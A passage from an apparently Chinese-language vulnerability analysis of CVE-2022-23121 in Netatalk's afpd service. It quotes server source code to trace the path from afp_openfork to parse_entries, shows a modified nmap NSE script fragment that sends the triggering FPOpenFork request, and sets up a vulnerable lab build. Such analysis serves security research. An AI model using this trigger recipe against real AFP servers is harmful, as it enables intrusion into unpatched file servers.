style="color:#f92672">*</span>rbuflen)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#75715e">/* First ad_open(), opens data or ressource fork */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ad_open(ofork<span style="color:#f92672">-></span>of_ad, upath, adflags,<span style="color:#ae81ff">0666</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span>.....</span></span></code></pre></div><p>在<code>libatalk/adouble/ad_open.c#ad_open</code> 函数中，当请求内设置了<code>ADFLAGS_RF</code>这个flag才会调用<code>ad_open_rf</code>函数</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (adflags<span style="color:#f92672">&amp;</span> ADFLAGS_RF) {<span style="color:#75715e">// ADFLAGS_RF = 1&lt;&lt;1 = 2</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (ad_open_rf(path, adflags, mode, ad)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span> EC_FAIL;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="触发漏洞流程"><strong>触发漏洞流程</strong></h3><p>想要触发该漏洞，必须要了解到afpd服务如何处理客户端请求，以便构造请求执行到漏洞代码处。</p><p>启动Netatalk的服务端afpd服务后，在afpd的<code>main</code>函数入口处初始化一些变量、加载AFP配置、监听端口等。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> ac,<span style="color:#66d9ef">char</span><span style="color:#f92672">**</span>av)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span><span style="color:#a6e22e">sigaction</span> sv;</span></span><span style="display:flex;"><span> sigset_t sigs;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ret;</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (afp_config_parse(<span style="color:#f92672">&amp;</span>obj,<span style="color:#e6db74">"afpd"</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> obj.options.save_mask<span style="color:#f92672">=</span> umask(obj.options.umask);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {</span></span><span style="display:flex;"><span> .......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span> asev<span style="color:#f92672">-></span>used; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (asev<span style="color:#f92672">-></span>fdset[i].revents<span style="color:#f92672">&amp;</span> (POLLIN<span style="color:#f92672">|</span> POLLERR<span style="color:#f92672">|</span> POLLHUP<span style="color:#f92672">|</span> POLLNVAL)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> (asev<span style="color:#f92672">-></span>data[i].fdtype) {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> LISTEN_FD:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((child<span style="color:#f92672">=</span> dsi_start(<span style="color:#f92672">&amp;</span>obj, (DSI<span style="color:#f92672">*</span>)(asev<span style="color:#f92672">-></span>data[i].<span style="color:#66d9ef">private</span>), server_children))) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(asev_add_fd(asev, child<span style="color:#f92672">-></span>afpch_ipc_fd, IPC_FD, child))) {</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> kill(child<span style="color:#f92672">-></span>afpch_pid, SIGKILL);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>之后进入<code>while</code>循环，调用<code>etc/afpd/main.c#dsi_start</code>，<code>dsi_start</code> 调用<code>dsi_getsession</code> ，在<code>dsi_getsession</code>中调用<code>dsi->proto_open</code> 函数指针，实际指向<code>libatalk/dsi/dsi_tcp.c#dsi_tcp_open</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> afp_child_t<span style="color:#f92672">*</span><span style="color:#a6e22e">dsi_start</span>(AFPObj<span style="color:#f92672">*</span>obj, DSI<span style="color:#f92672">*</span>dsi, server_child_t<span style="color:#f92672">*</span>server_children)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> afp_child_t<span style="color:#f92672">*</span>child<span style="color:#f92672">=</span> NULL;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (dsi_getsession(dsi, server_children, obj<span style="color:#f92672">-></span>options.tickleval,<span style="color:#f92672">&amp;</span>child)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* we've forked. */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (child<span style="color:#f92672">==</span> NULL) {</span></span><span style="display:flex;"><span> configfree(obj, dsi);</span></span><span style="display:flex;"><span> afp_over_dsi(obj);<span style="color:#75715e">/* start a session */</span></span></span><span style="display:flex;"><span> exit (<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> child;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">dsi_getsession</span>(DSI<span style="color:#f92672">*</span>dsi, server_child_t<span style="color:#f92672">*</span>serv_children,<span style="color:#66d9ef">int</span> tickleval, afp_child_t<span style="color:#f92672">**</span>childp)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#75715e">// 设置、初始化变量等操作，通过fork函数创建子进程</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">switch</span> (pid<span style="color:#f92672">=</span> dsi<span style="color:#f92672">-></span>proto_open(dsi)) {<span style="color:#75715e">/* in libatalk/dsi/dsi_tcp.c */</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><code>dsi_tcp_open</code>函数接收来自客户端的连接，通过fork函数创建子进程</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> pid_t<span style="color:#a6e22e">dsi_tcp_open</span>(DSI<span style="color:#f92672">*</span>dsi)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> pid_t pid;</span></span><span style="display:flex;"><span> SOCKLEN_T len;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> len<span style="color:#f92672">=</span><span style="color:#66d9ef">sizeof</span>(dsi<span style="color:#f92672">-></span>client);</span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>socket<span style="color:#f92672">=</span> accept(dsi<span style="color:#f92672">-></span>serversock, (<span style="color:#66d9ef">struct</span><span style="color:#a6e22e">sockaddr</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>dsi<span style="color:#f92672">-></span>client,<span style="color:#f92672">&amp;</span>len);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0</span><span style="color:#f92672">==</span> (pid<span style="color:#f92672">=</span> fork()) ) {<span style="color:#75715e">/* child */</span></span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* send back our pid */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> pid;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>返回到<code>dsi_getsession</code>函数中，当fork返回的pid为0时，即当前进程为子进程则跳出<code>switch</code>结构，进入处理DSI数据的逻辑，当返回的pid不为0也不为-1时，即当前进程为父进程，则返回到<code>dsi_start</code>函数。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">dsi_getsession</span>(DSI<span style="color:#f92672">*</span>dsi, server_child_t<span style="color:#f92672">*</span>serv_children,<span style="color:#66d9ef">int</span> tickleval, afp_child_t<span style="color:#f92672">**</span>childp)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#75715e">// 设置、初始化变量等操作</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">switch</span> (pid<span style="color:#f92672">=</span> dsi<span style="color:#f92672">-></span>proto_open(dsi)) {<span style="color:#75715e">/* in libatalk/dsi/dsi_tcp.c */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#75715e">// 如果是子进程则直接退出switch，进入处理DSI数据的逻辑</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">default</span><span style="color:#f92672">:</span><span style="color:#75715e">//如果是父进程则返回到dsi_start函数</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ......</span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>proto_close(dsi);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>childp<span style="color:#f92672">=</span> child;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> (dsi<span style="color:#f92672">-></span>header.dsi_command) {<span style="color:#75715e">// 根据dsi命令执行不同动作</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">case</span> DSIFUNC_STAT:<span style="color:#75715e">/* send off status and return */</span></span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DSIFUNC_OPEN:<span style="color:#75715e">/* setup session */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* set up the tickle timer */</span></span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>timer.it_interval.tv_sec<span style="color:#f92672">=</span> dsi<span style="color:#f92672">-></span>timer.it_value.tv_sec<span style="color:#f92672">=</span> tickleval;</span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>timer.it_interval.tv_usec<span style="color:#f92672">=</span> dsi<span style="color:#f92672">-></span>timer.it_value.tv_usec<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> dsi_opensession(dsi);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>childp<span style="color:#f92672">=</span> NULL;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">default</span><span style="color:#f92672">:</span><span style="color:#75715e">/* just close */</span></span></span><span style="display:flex;"><span> LOG(log_info, logtype_dsi,<span style="color:#e6db74">"DSIUnknown %d"</span>, dsi<span style="color:#f92672">-></span>header.dsi_command);</span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>proto_close(dsi);</span></span><span style="display:flex;"><span> exit(EXITERR_CLNT);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>之后回到<code>dsi_start</code>函数中，如果当前进程为父进程则返回到<code>main</code>函数中的<code>while</code>循环中，等待客户端的连接。如果当前进程为子进程则调用<code>afp_over_dsi</code>函数处理AFP数据，根据不同的AFP命令调用全局变量<code>afp_switch[]</code>内的不同函数指针进行处理</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">afp_over_dsi</span>(AFPObj<span style="color:#f92672">*</span>obj)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#75715e">/* get stuck here until the end */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> cmd<span style="color:#f92672">=</span> dsi_stream_receive(dsi);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span>(cmd) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DSIFUNC_CLOSE:</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DSIFUNC_TICKLE:</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DSIFUNC_CMD:</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> function<span style="color:#f92672">=</span> (u_char) dsi<span style="color:#f92672">-></span>commands[<span style="color:#ae81ff">0</span>];</span></span><span style="display:flex;"><span><span style="color:#75715e">/* send off an afp command. in a couple cases, we take advantage</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * of the fact that we're a stream-based protocol. */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (afp_switch[function]) {</span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>datalen<span style="color:#f92672">=</span> DSI_DATASIZ;</span></span><span style="display:flex;"><span> dsi<span style="color:#f92672">-></span>flags<span style="color:#f92672">|=</span> DSI_RUNNING;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> LOG(log_debug, logtype_afpd,<span style="color:#e6db74">"&lt;== Start AFP command: %s"</span>, AfpNum2name(function));</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> AFP_AFPFUNC_START(function, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)AfpNum2name(function));</span></span><span style="display:flex;"><span> err<span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>afp_switch[function])(obj,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)dsi<span style="color:#f92672">-></span>commands, dsi<span style="color:#f92672">-></span>cmdlen,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>dsi<span style="color:#f92672">-></span>data,<span style="color:#f92672">&amp;</span>dsi<span style="color:#f92672">-></span>datalen);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* error */</span></span></span><span style="display:flex;"><span> afp_dsi_die(EXITERR_CLNT);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><code>afp_switch</code>被<code>preauth_switch</code>初始化，里面只有少量函数指针，而在<code>postauth_switch</code>中含有大量函数指针，推测为经过身份验证后<code>afp_switch</code>被<code>postauth_switch</code>赋值</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> AFPCmd preauth_switch[]<span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span> NULL, NULL, NULL, NULL,</span></span><span style="display:flex;"><span> NULL, NULL, NULL, NULL,<span style="color:#75715e">/* 0 - 7 */</span></span></span><span style="display:flex;"><span> NULL, NULL, NULL, NULL,</span></span><span style="display:flex;"><span> NULL, NULL, NULL, NULL,<span style="color:#75715e">/* 8 - 15 */</span></span></span><span style="display:flex;"><span> NULL, NULL, afp_login, afp_logincont,</span></span><span style="display:flex;"><span> afp_logout, NULL, NULL, NULL,<span style="color:#75715e">/* 16 - 23 */</span></span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>AFPCmd<span style="color:#f92672">*</span>afp_switch<span style="color:#f92672">=</span> preauth_switch;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>AFPCmd postauth_switch[]<span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span> NULL, afp_bytelock, afp_closevol, afp_closedir,</span></span><span style="display:flex;"><span> afp_closefork, afp_copyfile, afp_createdir, afp_createfile,<span style="color:#75715e">/* 0 - 7 */</span></span></span><span style="display:flex;"><span> afp_delete, afp_enumerate, afp_flush, afp_flushfork,</span></span><span style="display:flex;"><span> afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,<span style="color:#75715e">/* 8 - 15 */</span></span></span><span style="display:flex;"><span> afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,</span></span><span style="display:flex;"><span> afp_logout, afp_mapid, afp_mapname, afp_moveandrename,<span style="color:#75715e">/* 16 - 23 */</span></span></span><span style="display:flex;"><span> afp_openvol, afp_opendir, afp_openfork, afp_read,</span></span><span style="display:flex;"><span> afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,</span></span><span style="display:flex;"><span><span style="color:#75715e">/* 24 - 31 */</span></span></span><span style="display:flex;"><span> afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,</span></span><span style="display:flex;"><span> afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid,<span style="color:#75715e">/* 32 - 39 */</span></span></span><span style="display:flex;"><span> afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,</span></span><span style="display:flex;"><span> afp_null, afp_null, afp_null, afp_null,<span style="color:#75715e">/* 40 - 47 */</span></span></span><span style="display:flex;"><span> afp_opendt, afp_closedt, afp_null, afp_geticon,</span></span><span style="display:flex;"><span> afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,<span style="color:#75715e">/* 48 - 55 */</span></span></span><span style="display:flex;"><span> afp_addcomment, afp_rmvcomment, afp_getcomment, NULL,</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">set_auth_switch</span>(<span style="color:#66d9ef">const</span> AFPObj<span style="color:#f92672">*</span>obj,<span style="color:#66d9ef">int</span> expired)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> afp_switch<span style="color:#f92672">=</span> postauth_switch;</span></span></code></pre></div><p>在函数调用链中，<code>afp_openfork</code>在<code>afp_switch</code>的下标为26，同时26也可以在AFP数据包内看到：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/6.png"/></p><p><strong>调用总结</strong></p><p>总结以上触发流程，触发到<code>afp_openfork</code>函数需要AFP数据包内<code>Command</code>字段值为26同时需要设置<code>ADFLAGS_RF</code> 这个<code>flag</code>，触发漏洞链条为：<code>afp_openfork->ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries</code>。</p><p>函数调用图如下：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/7.png"/></p><p><strong>如何发送FPOpenFork请求</strong></p><p>前面说过在nmap中含有afp相关的脚本，在nmap自带的lua库afp.lua中含有读取文件相关的函数，调用之，最终nse脚本如下，需要注意的是，在<strong>FPOpenFork</strong>请求中必须设置<code>ADFLAGS_RF</code> 这个flag才会触发到漏洞函数逻辑，在nmap自带的afp.lua的<code>ReadFile</code>函数中，该flag写死为0，需要修改为0x2，请求中的<code>ADFLAGS_RF</code> 才会被设置。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span/></span><span style="display:flex;"><span>action<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>host, port<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span>-- 和afp-ls逻辑一样</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> local str_path<span style="color:#f92672">=</span> args<span style="color:#f92672">[</span><span style="color:#e6db74">"path"</span><span style="color:#f92672">]</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> local content</span></span><span style="display:flex;"><span> status, content<span style="color:#f92672">=</span> afpHelper:ReadFile<span style="color:#f92672">(</span>str_path<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span> status, response<span style="color:#f92672">=</span> afpHelper:Logout<span style="color:#f92672">()</span></span></span><span style="display:flex;"><span> status, response<span style="color:#f92672">=</span> afpHelper:CloseSession<span style="color:#f92672">()</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> content</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> end</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span></span></span><span style="display:flex;"><span>end</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/8.png"/></p><p><strong>文件内应该包含什么</strong></p><p>在函数调用链中的<code>ad_header_read_osx</code> 函数中，有备注*<code>Read an ._ file, only uses the resofork, finderinfo is taken from EA</code> ，该函数只会使用<code>resofork</code> 和<code>finderinfo</code> 这两种entry，*所以在生成触发该漏洞的文件时只需要包含这两种entry即可。</p><h2 id="环境搭建">环境搭建</h2><p>这里使用Netatalk 3.1.11版本搭建</p><ul><li><p>系统版本 Ubuntu 1804</p></li><li><p>内核版本</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ubuntu:~/nettatalk/netatalk-3.1.11/build/sbin/genefile# uname -a</span></span><span style="display:flex;"><span>Linux ubuntu 5.13.0-40-generic<span style="color:#75715e">#45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span></span></code></pre></div></li><li><p>libc版本 libc-2.31.so</p></li></ul><p><strong>Netatalk编译</strong></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt-get install -y libdb-dev libgcrypt-dev libcrack2-dev libgssapi-krb5-2 libgssapi3-heimdal libgssapi-perl libkrb5-dev libtdb-dev libevent-dev libdb-dev</span></span><span style="display:flex;"><span>wget https://versaweb.dl.sourceforge.net/project/netatalk/netatalk/3.1.11/netatalk-3.1.11.tar.bz2</span></span><span style="display:flex;"><span>tar -xjf netatalk-3.1.11.tar.bz2</span></span><span style="display:flex;"><span>cd netatalk-3.1.11.tar.bz2</span></span><span style="display:flex;"><span>mkdir build</span></span><span style="display:flex;"><span>export CFLAGS<span style="color:#f92672">=</span><span style="color:#e6db74">'-g -O0'</span><span style="color:#75715e"># 保留调试符号，方便调试</span></span></span><span style="display:flex;"><span>./configure<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--with-init-style<span style="color:#f92672">=</span>debian-systemd<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--without-libevent<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--without-tdb<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--with-cracklib<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--enable-krbV-uam<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--enable-debug<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--with-pam-confdir<span style="color:#f92672">=</span>/etc/pam.d<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--with-dbus-daemon<span style="color:#f92672">=</span>/usr/bin/dbus-daemon<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--with-dbus-sysconf-dir<span style="color:#f92672">=</span>/etc/dbus-1/system.d<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--with-tracker-pkgconfig-version<span style="color:#f92672">=</span>1.0<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--prefix<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/build<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--bindir<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/build/bin<span style="color:#ae81ff">\</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"/>--sbindir<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/build/sbin</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>make</span></span><span style="display:flex;"><span>make install</span></span></code></pre></div><p><strong>Netatalk配置</strong></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /tmp/afp_tmp/</span></span><span style="display:flex;"><span>mkdir /tmp/afp_tmp/Public</span></span><span style="display:flex;"><span>mkdir /tmp/afp_tmp/test</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>echo test > /tmp/afp_tmp/test/test.txt</span></span><span style="display:flex;"><span>echo hello > /tmp/afp_tmp//Public/hello.txt</span></span><span style="display:flex;"><span>chmod<span style="color:#ae81ff">777</span> -R /tmp/afp_tmp/Public /tmp/afp_tmp/test</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/afp_tmp/afp.conf:</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> Global<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>uam list<span style="color:#f92672">=</span> uams_guest.so,uams_clrtxt.so,uams_dhx2.so</span></span><span style="display:flex;"><span>save password<span style="color:#f92672">=</span> no</span></span><span style="display:flex;"><span>unix charset<span style="color:#f92672">=</span> UTF8</span></span><span style="display:flex;"><span>use sendfile<span style="color:#f92672">=</span> yes</span></span><span style="display:flex;"><span>zeroconf<span style="color:#f92672">=</span> no</span></span><span style="display:flex;"><span>guest account<span style="color:#f92672">=</span> nobody</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">[</span> Public<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>path<span style="color:#f92672">=</span>/tmp/afp_tmp/Public</span></span><span style="display:flex;"><span>ea<span style="color:#f92672">=</span> auto</span></span><span style="display:flex;"><span>convert appledouble<span style="color:#f92672">=</span> no</span></span><span style="display:flex;"><span>stat vol<span style="color:#f92672">=</span> no</span></span><span style="display:flex;"><span>file perm<span style="color:#f92672">=</span><span style="color:#ae81ff">777</span></span></span><span style="display:flex;"><span>directory perm<span style="color:#f92672">=</span><span style="color:#ae81ff">777</span></span></span><span style="display:flex;"><span>veto files<span style="color:#f92672">=</span><span style="color:#e6db74">'/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/'</span></span></span><span style="display:flex;"><span>rwlist<span style="color:#f92672">=</span><span style="color:#e6db74">"admin"</span>,<span style="color:#e6db74">"nobody"</span>,<span style="color:#e6db74">"@allaccount"</span></span></span><span style="display:flex;"><span>valid users<span style="color:#f92672">=</span><span style="color:#e6db74">"admin"</span>,<span style="color:#e6db74">"nobody"</span>,<span style="color:#e6db74">"@allaccount"</span></span></span><span style="display:flex;"><span>invalid users<span style="color:#f92672">=</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">[</span> test<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>path<span style="color:#f92672">=</span> 